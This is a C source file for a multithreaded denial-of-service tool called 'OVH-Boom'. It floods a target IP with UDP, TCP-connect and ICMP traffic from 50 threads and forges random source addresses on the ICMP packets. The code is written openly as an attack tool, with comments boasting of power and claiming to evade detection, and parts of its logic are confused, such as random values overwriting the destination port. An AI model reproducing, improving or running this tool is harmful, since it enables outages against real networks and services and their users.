#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <pthread.h>

#define PACKET_SIZE 4096
#define THREADS 50  // Increased threads for insane power!
#define MAX_PORT 65535

// IP header structure
struct ipheader {
    unsigned char  iph_ihl:4, iph_ver:4;
    unsigned char  iph_tos;
    unsigned short iph_len;
    unsigned short iph_ident;
    unsigned short iph_offset;
    unsigned char  iph_ttl;
    unsigned char  iph_protocol;
    unsigned short iph_chksum;
    unsigned int   iph_source;
    unsigned int   iph_dest;
};

// ICMP header structure
struct icmpheader {
    unsigned char icmp_type;
    unsigned char icmp_code;
    unsigned short icmp_cksum;
    unsigned short icmp_id;
    unsigned short icmp_seq;
};

// Pseudo header for checksum calculation
struct pseudo_header {
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;
};

// Function to calculate checksum
unsigned short checksum(unsigned short *buf, int len) {
    unsigned long sum = 0;
    unsigned short *ptr = buf;
    unsigned short oddbyte;
    
    while (len > 1) {
        sum += *ptr++;
        len -= 2;
    }
    
    if (len == 1) {
        oddbyte = 0;
        *((unsigned char*)&oddbyte) = *(unsigned char*)ptr;
        sum += oddbyte;
    }
    
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    
    return ~sum;
}

// Function to generate random IP address for spoofing
void random_ip(char *ip) {
    sprintf(ip, "%d.%d.%d.%d", rand() % 255, rand() % 255, rand() % 255, rand() % 255);
}

// Function to flood using UDP packets with dynamic source ports and payloads
void udp_flood(const char *target, int port, int duration) {
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        perror("UDP socket");
        exit(1);
    }

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);  // Randomized target port
    sin.sin_addr.s_addr = inet_addr(target);

    char packet[PACKET_SIZE];
    memset(packet, 'A', PACKET_SIZE);  // Fill with junk data to flood

    time_t start = time(NULL);

    while ((time(NULL) - start) < duration) {
        // Change the source port to avoid detection
        int random_src_port = rand() % MAX_PORT;
        sin.sin_port = htons(random_src_port);

        // Send UDP packet with randomized data to flood the target
        sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&sin, sizeof(sin));
    }

    close(sock);
}

// Function to flood using TCP packets with randomized source ports and dynamic connections
void tcp_flood(const char *target, int port, int duration) {
    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock < 0) {
        perror("TCP socket");
        exit(1);
    }

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);  // Randomized target port
    sin.sin_addr.s_addr = inet_addr(target);

    time_t start = time(NULL);

    while ((time(NULL) - start) < duration) {
        // Randomize the source port for each connection attempt
        int random_src_port = rand() % MAX_PORT;
        sin.sin_port = htons(random_src_port);

        // Establish connection and flood
        connect(sock, (struct sockaddr *)&sin, sizeof(sin));
    }

    close(sock);
}

// Function to flood using ICMP packets with randomized headers and source IPs
void icmp_flood(const char *target, int duration) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) {
        perror("ICMP socket");
        exit(1);
    }

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = 0;
    sin.sin_addr.s_addr = inet_addr(target);

    char packet[PACKET_SIZE];
    struct ipheader *ip = (struct ipheader *)packet;
    struct icmpheader *icmp_pkt = (struct icmpheader *)(packet + sizeof(struct ipheader));

    time_t start = time(NULL);

    while ((time(NULL) - start) < duration) {
        memset(packet, 0, PACKET_SIZE);

        // ICMP Header
        icmp_pkt->icmp_type = ICMP_ECHO;
        icmp_pkt->icmp_code = 0;
        icmp_pkt->icmp_id = rand();
        icmp_pkt->icmp_seq = rand();
        icmp_pkt->icmp_cksum = 0;

        // Calculate ICMP checksum
        icmp_pkt->icmp_cksum = checksum((unsigned short *)icmp_pkt, sizeof(struct icmpheader));

        // Randomize source IP to spoof
        char spoof_ip[16];
        random_ip(spoof_ip);

        ip->iph_ver = 4;
        ip->iph_ihl = 5;
        ip->iph_tos = 0;
        ip->iph_len = htons(sizeof(struct ipheader) + sizeof(struct icmpheader));
        ip->iph_ident = htons(rand() % 65535);
        ip->iph_offset = 0;
        ip->iph_ttl = 255;
        ip->iph_protocol = IPPROTO_ICMP;
        ip->iph_source = inet_addr(spoof_ip);
        ip->iph_dest = sin.sin_addr.s_addr;
        ip->iph_chksum = checksum((unsigned short *)packet, sizeof(struct ipheader));

        sendto(sock, packet, sizeof(struct ipheader) + sizeof(struct icmpheader), 0, (struct sockaddr *)&sin, sizeof(sin));
    }

    close(sock);
}

// Thread function for launching the combined attack
void *ovh_boom_attack(void *args) {
    char *target = ((char **)args)[0];
    int port = atoi(((char **)args)[1]);
    int duration = atoi(((char **)args)[2]);

    // Launch the attack with UDP, TCP, and ICMP floods
    udp_flood(target, port, duration);
    tcp_flood(target, port, duration);
    icmp_flood(target, duration);

    return NULL;
}

// Main function
int main(int argc, char *argv[]) {
    if (argc < 4) {
        printf("Usage: %s <target IP> <port> <duration (seconds)>\n", argv[0]);
        return 1;
    }

    const char *target = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);

    pthread_t threads[THREADS];

    printf("Starting OVH-Boom attack on target: %s, port: %d for %d seconds...\n", target, port, duration);

    // Spawn threads for different attack types
    for (int i = 0; i < THREADS; i++) {
        char *args[] = { (char *)target, argv[2], argv[3] };
        pthread_create(&threads[i], NULL, ovh_boom_attack, args);
    }

    // Wait for threads to finish
    for (int i = 0; i < THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("\nOVH-Boom attack complete. Maximum power deployed!\n");
    return 0;
}
